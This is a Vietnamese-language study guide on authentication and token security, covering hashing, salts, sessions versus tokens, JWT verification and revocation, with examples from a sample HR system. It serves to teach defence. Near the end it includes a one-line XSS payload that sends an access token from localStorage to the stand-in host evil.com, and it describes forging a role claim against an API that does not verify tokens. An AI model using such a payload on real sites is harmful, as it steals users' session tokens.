1. Nền tảng

Xưng tên → chứng minh → xin phép. Đăng nhập thành công không có nghĩa là được làm mọi thứ.

Identity vs Account vs Credential

Là gìDanh tính: “một người/máy cụ thể” cùng các thuộc tínhBản ghi của danh tính trong một hệ thốngThứ dùng để chứng minh mình là chủ account

Identity là “người”, account là “hồ sơ của người ở một nơi”, credential là “chìa khóa mở hồ sơ”.

IdP/AS “phát giấy”; SP/RP “đọc giấy để cho người vào”; RS “đọc vé để cho gọi API”.

MFA đếm loại yếu tố, 2SV chỉ đếm số bước.

2. Mật mã

Encoding vs Encryption vs Hashing vs Signature vs HMAC
Kỹ thuậtMục đíchCần khóa?Đảo ngược?Ví dụ
EncodingĐổi định dạng để truyền đượcKhôngCó, ai cũng làm đượcBase64URL trong JWT
EncryptionGiữ bí mật nội dungCóCó, nếu có khóaAES-GCM, TLS, JWE
Hashing“Dấu vân tay” cố định, phát hiện thay đổiKhôngKhông (một chiều)SHA-256
SignatureChứng minh ai tạo + không bị sửaPrivate key ký, public key kiểmKhông (dùng để kiểm)RS256, ES256
HMACChống sửa giữa hai bên cùng giữ một bí mậtMột secret dùng chungKhôngHS256, ký webhook

Ví dụ: Phần payload của JWT chỉ được encode Base64URL — ai copy token vào jwt.io cũng đọc được. Thứ bảo vệ token là chữ ký, không phải “mã hóa”.

Encoding không bảo mật gì; encryption giấu nội dung; hash/HMAC/signature chống sửa (signature còn chứng minh được ai ký).

📚 Học kỹ: Bài 2.1 — Những phân biệt quan trọng

Symmetric vs Asymmetric
Tiêu chíSymmetric (đối xứng)Asymmetric (bất đối xứng)
KhóaMột khóa chung cho cả hai bênCặp khóa: private (giữ kín) + public (công khai)
Tốc độNhanhChậm hơn nhiều
Khó khănPhải chia sẻ khóa an toànPhải tin public key đúng là của ai (cần certificate/JWKS)
Ví dụ trong authAES, HS256 (HMAC)RSA, ECDSA: RS256, ES256, chữ ký passkey

Ví dụ: Keycloak ký access token bằng RS256: chỉ Keycloak giữ private key, còn hr-api và mọi API khác tải public key từ JWKS để kiểm. Nếu dùng HS256, mọi API phải giữ cùng secret — và API nào cũng có thể giả token.

Đối xứng = một chìa cho mọi người; bất đối xứng = ổ khóa công khai, chìa riêng chỉ một người giữ.

📚 Học kỹ: Bài 2.1 — Symmetric vs Asymmetric

Hash thường vs Password hash (và Salt vs Pepper)
Tiêu chíHash thường (SHA-256)Password hash (Argon2id, bcrypt, PBKDF2)
Thiết kế đểNhanh (checksum, chữ ký)Chậm có chủ đích, tốn RAM/CPU, chỉnh được
Brute-force mật khẩuGPU thử hàng tỷ lần/giâyMỗi lần thử tốn nhiều ms → rất đắt
SaltKhông có sẵnSalt ngẫu nhiên riêng cho từng user, lưu cùng hash trong DB
Pepper—(Tùy chọn) một bí mật chung, lưu ngoài DB (key vault/HSM)

Ví dụ: Hai nhân viên cùng đặt mật khẩu Kaopiz2026. Với SHA-256 không salt, hai hash giống hệt nhau và tra được trong rainbow table. Với Argon2id + salt riêng, hai hash khác nhau và mỗi lần đoán đều tốn chi phí. Nếu có pepper, kẻ trộm chỉ lấy được DB vẫn thiếu một mảnh để đoán.

Mật khẩu thì dùng hash chậm. Salt không bí mật nhưng phải riêng từng user; pepper là bí mật chung, để ngoài DB.

TLS: “tôi kiểm anh”. mTLS: “hai bên kiểm nhau”.

3. Session & token

Cookie vs Session vs Token
Tiêu chíCookieSessionToken
Bản chấtCơ chế lưu/gửi dữ liệu nhỏ của trình duyệtTrạng thái đăng nhập lưu ở serverChuỗi tự mang thông tin (hoặc tham chiếu) chứng minh quyền
Nằm ở đâuTrình duyệt, tự gửi kèm mọi request cùng siteRAM/Redis/DB của serverBất kỳ đâu client giữ; gửi trong header Authorization
Thường chứaSession ID, hoặc chính tokenUser ID, thời điểm đăng nhập…Claims: sub, aud, exp, scope…
Thu hồi—Xóa ở server là xongKhó hơn nếu là JWT (sống tới exp)

Ví dụ: hr-web giữ session của An trên server; trình duyệt chỉ có cookie .AspNetCore.Cookies (chứa tham chiếu tới session). Khi hr-web gọi hr-api, nó gửi access token chứ không gửi cookie.

Cookie là “cái túi”, session là “hồ sơ ở quầy”, token là “tấm vé mang theo người”. Túi có thể đựng số hồ sơ hoặc đựng vé.

📚 Học kỹ: Bài 2.2 — Cookie ≠ Session

Stateful vs Stateless
Tiêu chíStatefulStateless
Server có nhớ phiên?Có, tra session store mỗi requestKhông, mọi thông tin nằm trong token tự kiểm được
Scale nhiều serverCần store dùng chung (Redis) hoặc sticky sessionDễ: server nào cũng kiểm được chữ ký
Thu hồi tức thìDễ: xóa sessionKhó: phải chờ token hết hạn hoặc thêm denylist
Ví dụCookie session của hr-webhr-api kiểm JWT bằng JWKS

Ví dụ: Admin khóa account An lúc 10:00. hr-web (stateful) xóa session → An bị đẩy ra ngay. hr-api (stateless) vẫn chấp nhận access token còn hạn tới 10:05 — vì vậy access token nên sống ngắn.

Stateful dễ thu hồi, khó scale; stateless dễ scale, khó thu hồi.

Access token vs ID token vs Refresh token

Ví dụ: Sau khi An đăng nhập, hr-web đọc ID token để hiển thị “Xin chào An”, gửi access token (aud = hr-api) khi gọi API lương, và giữ refresh token để 5 phút sau lấy access token mới mà An không phải đăng nhập lại.

ID token cho app biết “ai”; access token cho API biết “được gì”; refresh token chỉ nói chuyện với AS.

Opaque token vs JWT
Tiêu chíOpaque tokenJWT

Opaque = “số phiếu”, phải hỏi quầy; JWT = “vé có dấu mộc”, tự kiểm tại cửa.

JWS vs JWE
Tiêu chíJWS (JSON Web Signature)JWE (JSON Web Encryption)
Bảo vệToàn vẹn + nguồn gốc (chữ ký)Bí mật nội dung (mã hóa)

Ví dụ: Access token Keycloak cấp cho hr-api là JWS (3 phần) — đừng nhét số CCCD hay lương vào claims, vì ai cầm token cũng đọc được.

“JWT” hằng ngày gần như luôn là JWS: có dấu mộc nhưng không có phong bì.

Decode vs Verify (JWT)
Tiêu chíDecodeVerify / Validate
Làm gìBase64URL-decode để đọc header, payloadKiểm chữ ký bằng đúng key + kiểm iss, aud, exp, nbf, alg
Cần key?KhôngCó (public key từ JWKS hoặc secret)

Ví dụ: Một API chỉ gọi JwtSecurityTokenHandler.ReadJwtToken() rồi đọc role từ payload. Kẻ tấn công tự sửa payload thành "role":"admin", encode lại → API tin ngay, vì nó mới chỉ decode, chưa verify.

Đọc được không có nghĩa là tin được. Chưa verify thì mọi claim chỉ là lời tự khai.

Token Introspection vs Token Revocation
Tiêu chíIntrospection (RFC 7662)Revocation (RFC 7009)
Câu hỏi“Token này còn sống không, của ai, scope gì?”“Hãy hủy token này đi”

Ví dụ: An bấm “Đăng xuất” → hr-web gọi /revoke với refresh token. Lần sau hr-api introspect một token liên quan sẽ nhận {"active": false} (với JWT tự kiểm thì API không biết, trừ khi nó introspect).

Introspection là hỏi, revocation là hủy.

“Bearer” = ai cầm cũng dùng được, nên phải sống ngắn và chỉ đi qua HTTPS. Basic và API key là bí mật dài hạn gửi đi liên tục.

Tiêu chíOAuth 2.0OpenID Connect (OIDC)

Ví dụ: Một đoạn XSS chỉ cần fetch('https://evil.com?t='+localStorage.access_token) là token đã ra ngoài. Với cookie HttpOnly; Secure; SameSite=Lax, đoạn script đó không đọc được gì.

Không có nơi nào trong trình duyệt an toàn tuyệt đối trước XSS; HttpOnly cookie chỉ ngăn lấy token mang đi.
